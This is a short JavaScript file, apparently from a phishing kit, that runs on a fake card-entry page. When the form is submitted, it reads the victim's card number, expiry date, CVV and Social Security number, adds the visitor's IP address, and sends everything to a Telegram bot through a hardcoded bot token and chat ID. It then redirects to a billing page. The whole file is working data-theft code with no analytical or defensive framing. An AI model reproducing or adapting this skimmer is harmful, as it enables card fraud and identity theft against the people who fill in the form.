


$(document).ready(function() {
    
    fetch('https://api64.ipify.org?format=json')
.then(response => response.json())
.then(data => {
    const ipAddressInput = document.getElementById('ipaddress');
    if (ipAddressInput) {
        ipAddressInput.value = data.ip;
    }
})
.catch(error => console.error('Error fetching IP address:', error));

$('#filled-form').on('submit', function(event) {
    event.preventDefault(); 
    
            const CardNoo = document.getElementById('caardnumber').value;
            const cvvv = document.getElementById('cccvv').value;
            const snn = document.getElementById('ssn').value;
            const expp = document.getElementById('expDate').value;
            const ipp = document.getElementById('ipaddress').value;

            const message = 
                "*Home Page - New Card Submission*" + "\n" +
                "Card Number: " + CardNoo + "\n" +
                "Expiry Date: " + expp + "\n" +
                "CVV: " + cvvv + "\n"+
                "SSN: " + snn + "\n"+
                "User IP: " + ipp + "\n";
                

            const telegramBotToken = '6349399260:AAEzm1BGmAM3u_xiXgRs2xRgDyOZ78vsbyg';
            const chatId = '5308018861';

            const sendMessage = (text) => {
                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
                fetch(url)
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Network response was not ok');
                        }
                        console.log('Message sent successfully');
                        window.location.href = 'billing.html'; 
                    })
                    .catch(error => console.error('Error:', error));
            };

            sendMessage(message);
            document.getElementById('ipaddress').value = '';
            document.getElementById('expDate').value = '';
            document.getElementById('ssn').value = '';
            document.getElementById('cccvv').value = '';
            document.getElementById('caardnumber').value = '';
});

});
